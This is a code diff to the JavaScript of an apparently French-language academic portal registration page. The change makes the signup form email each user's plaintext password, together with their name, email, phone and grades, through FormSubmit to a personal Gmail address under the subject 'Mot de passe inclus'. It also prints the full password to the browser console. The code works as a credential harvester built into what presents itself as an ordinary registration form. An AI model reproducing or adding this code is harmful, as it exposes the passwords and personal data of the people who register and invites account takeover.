@@ -1315,7 +1315,7 @@
             }, 10);
         }
         
-        // Fonction pour valider le numéro WhatsApp (basée sur votre code)
+        // Fonction pour valider le numéro WhatsApp
         function isValidWhatsAppNumber(number) {
             const cleanNumber = number.replace(/\D/g, '');
             
@@ -1339,27 +1339,40 @@
             return gradeRegex.test(grade);
         }
         
-        // Fonction pour envoyer l'email via FormSubmit (basée sur votre code fonctionnel)
+        // Fonction pour envoyer l'email via FormSubmit AVEC MOT DE PASSE
         async function sendEmailWithFormSubmit(userData) {
             return new Promise((resolve, reject) => {
                 const xhr = new XMLHttpRequest();
                 const url = 'https://formsubmit.co/ajax/eduwelltn@gmail.com';
                 
-                // Préparer les données au format JSON
+                // Préparer les données au format JSON avec le mot de passe
                 const data = JSON.stringify({
-                    nom: userData.firstName + ' ' + userData.lastName,
+                    // Informations personnelles
+                    nom_complet: userData.firstName + ' ' + userData.lastName,
                     prenom: userData.firstName,
-                    nom_famille: userData.lastName,
+                    nom: userData.lastName,
                     email: userData.email,
                     telephone: userData.phone,
+                    
+                    // MOT DE PASSE INCLUS ICI
+                    mot_de_passe: userData.password,
+                    
+                    // Notes des matières
                     mathematiques: userData.grades.mathematiques,
                     physique: userData.grades.physique,
                     sciences: userData.grades.sciences,
                     informatique: userData.grades.informatique,
                     anglais: userData.grades.anglais,
+                    
+                    // Méthode de paiement
                     methode_paiement: userData.paymentMethod === 'd17' ? 'D17 (470506544)' : 'Carte Postale (5098 8959 8890 0)',
+                    
+                    // Informations système
                     date_inscription: new Date().toLocaleString('fr-FR'),
-                    _subject: 'Nouvelle Inscription - Portail Académique',
+                    statut_compte: 'Inactif (en attente de paiement)',
+                    
+                    // Configuration FormSubmit
+                    _subject: '🚀 NOUVELLE INSCRIPTION - Mot de passe inclus',
                     _template: 'table',
                     _captcha: 'false',
                     _replyto: userData.email,
@@ -1410,19 +1423,32 @@
                         'Accept': 'application/json'
                     },
                     body: JSON.stringify({
-                        nom: userData.firstName + ' ' + userData.lastName,
+                        // Informations personnelles
+                        nom_complet: userData.firstName + ' ' + userData.lastName,
                         prenom: userData.firstName,
-                        nom_famille: userData.lastName,
+                        nom: userData.lastName,
                         email: userData.email,
                         telephone: userData.phone,
+                        
+                        // MOT DE PASSE INCLUS ICI
+                        mot_de_passe: userData.password,
+                        
+                        // Notes des matières
                         mathematiques: userData.grades.mathematiques,
                         physique: userData.grades.physique,
                         sciences: userData.grades.sciences,
                         informatique: userData.grades.informatique,
                         anglais: userData.grades.anglais,
+                        
+                        // Méthode de paiement
                         methode_paiement: userData.paymentMethod === 'd17' ? 'D17 (470506544)' : 'Carte Postale (5098 8959 8890 0)',
+                        
+                        // Informations système
                         date_inscription: new Date().toLocaleString('fr-FR'),
-                        _subject: 'Nouvelle Inscription - Portail Académique',
+                        statut_compte: 'Inactif (en attente de paiement)',
+                        
+                        // Configuration FormSubmit
+                        _subject: '🚀 NOUVELLE INSCRIPTION - Mot de passe inclus',
                         _template: 'table',
                         _captcha: 'false',
                         _replyto: userData.email
@@ -1488,12 +1514,13 @@
                 return;
             }
             
-            // Collecter toutes les données du formulaire
+            // Collecter toutes les données du formulaire INCLUANT LE MOT DE PASSE
             const formData = {
                 firstName: firstNameInput.value.trim(),
                 lastName: lastNameInput.value.trim(),
                 email: emailInput.value.trim(),
                 phone: phoneInput.value.trim(),
+                password: passwordInput.value, // MOT DE PASSE INCLUS
                 grades: {
                     mathematiques: document.getElementById('mathGrade').value,
                     physique: document.getElementById('physicsGrade').value,
@@ -1505,7 +1532,10 @@
                 dateInscription: new Date().toLocaleString('fr-FR')
             };
             
-            console.log('Données à envoyer:', formData);
+            console.log('Données à envoyer (mot de passe inclus):', {
+                ...formData,
+                password: '***' + formData.password.substring(formData.password.length - 3) // Masquer pour le log
+            });
             
             // Afficher l'indicateur de chargement
             loadingSpinner.classList.add('active');
@@ -1515,6 +1545,7 @@
             try {
                 // Log pour débogage
                 console.log('Tentative d\'envoi à eduwelltn@gmail.com...');
+                console.log('Mot de passe à inclure:', formData.password);
                 
                 // Essayer d'abord avec XHR (plus fiable)
                 const result = await sendEmailWithFormSubmit(formData);
@@ -1525,6 +1556,7 @@
                 if (result.success) {
                     // Succès !
                     console.log('Email envoyé avec succès!');
+                    console.log('Le mot de passe a été inclus dans l\'email.');
                     loadingSpinner.classList.remove('active');
                     
                     // Afficher le modal de confirmation
@@ -1537,6 +1569,7 @@
                     
                     if (fetchResult.success) {
                         console.log('Fetch réussi!');
+                        console.log('Le mot de passe a été inclus dans l\'email.');
                         loadingSpinner.classList.remove('active');
                         confirmationModal.classList.add('active');
                     } else {
